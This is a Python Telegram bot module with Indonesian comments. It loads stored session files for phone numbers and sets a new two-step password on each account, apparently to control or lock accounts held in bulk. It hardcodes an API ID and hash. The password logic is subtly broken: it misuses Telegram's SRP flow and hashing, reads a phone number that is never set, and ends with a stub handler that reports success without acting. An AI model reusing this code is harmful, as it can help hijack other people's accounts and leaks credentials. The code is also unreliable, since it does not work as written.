from telethon import TelegramClient
from telethon.tl.functions.account import UpdatePasswordSettingsRequest, GetPasswordRequest
from telethon.tl.types.account import PasswordInputSettings
from telethon.errors import SessionPasswordNeededError
from telegram import Update
from telegram.ext import CallbackContext, ConversationHandler
import os
import hashlib

# Define states
PASSWORD_INPUT = 1

API_ID = 23520639
API_HASH = 'bcbc7a22cde8fa2ba7d1baad086086ca'

async def start_set_password(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()

    nomor = query.data.split("_")[2]
    session_file = f"../ew_sessions/{nomor}.session"

    if not os.path.exists(session_file):
        await query.edit_message_text("❌ Session tidak ditemukan.")
        return ConversationHandler.END

    # Mengirimkan pesan untuk meminta password baru
    await query.edit_message_text("🛡️ Silakan kirim password baru untuk akun ini (dalam 60 detik)...")
    
    # Menunggu input password dari pengguna
    return PASSWORD_INPUT

async def receive_password(update: Update, context: CallbackContext):
    password_baru = update.message.text.strip()
    nomor = context.user_data['phone_number']  # Mengambil nomor telepon dari data pengguna
    session_file = f"../ew_sessions/{nomor}.session"

    if not os.path.exists(session_file):
        await update.message.reply_text("❌ Session tidak ditemukan.")
        return ConversationHandler.END

    # Memulai sesi dengan session file
    client = TelegramClient(session_file, API_ID, API_HASH)
    await client.connect()

    try:
        # Mengambil informasi password lama
        pwd_info = await client(function=GetPasswordRequest())
    except SessionPasswordNeededError:
        await update.message.reply_text("❌ Akun memerlukan password lama untuk mengubah password.")
        await client.disconnect()
        return ConversationHandler.END

    # Hash password baru
    password_bytes = password_baru.encode("utf-8")
    pwd_hash = hashlib.pbkdf2_hmac("sha512", password_bytes, pwd_info.salt, 100000)

    # Memperbarui password
    await client(function=UpdatePasswordSettingsRequest(
        current_password=pwd_info,
        new_settings=PasswordInputSettings(
            password_hash=pwd_hash,
            hint="Password Baru"
        )
    ))

    await update.message.reply_text("✅ Password berhasil diubah.")
    await client.disconnect()
    return ConversationHandler.END

def set_password_callback(update: Update, context: CallbackContext):
    # Proses perubahan password di sini
    user = update.effective_user
    new_password = update.message.text  # Asumsikan pesan berisi password baru
    
    # Logika untuk mengubah password, simpan atau proses lebih lanjut
    update.message.reply_text(f"Password untuk {user.first_name} telah diubah!")
    return ConversationHandler.END
